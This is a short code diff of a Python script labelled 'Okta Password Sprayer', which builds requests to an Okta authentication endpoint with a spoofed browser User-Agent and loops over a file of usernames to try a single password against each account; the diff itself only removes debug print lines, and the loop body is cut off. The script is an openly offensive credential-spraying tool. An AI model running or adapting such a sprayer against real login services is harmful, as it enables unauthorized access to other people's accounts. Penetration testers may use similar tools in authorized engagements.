@@ -20,19 +20,13 @@ domain2 = domain[0]
 
 oktadomain = '%s.okta.com' % domain2
 
-print(options.password)
-
 url = 'https://%s/api/v1/authn' % oktadomain
 headers = {'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36'}
-
-print(url)
 
 print("+"*100)
 print("Okta Password Sprayer")
 print("+"*100)
 password = options.password.strip()
-string = "You are running a password spray with users in %s and password %s." % (options.inputfile,options.password)
-print("+"*100)
 print("Spraying...")
 with open ("%s" % options.inputfile, "r") as oktausers:
     for line in oktausers:
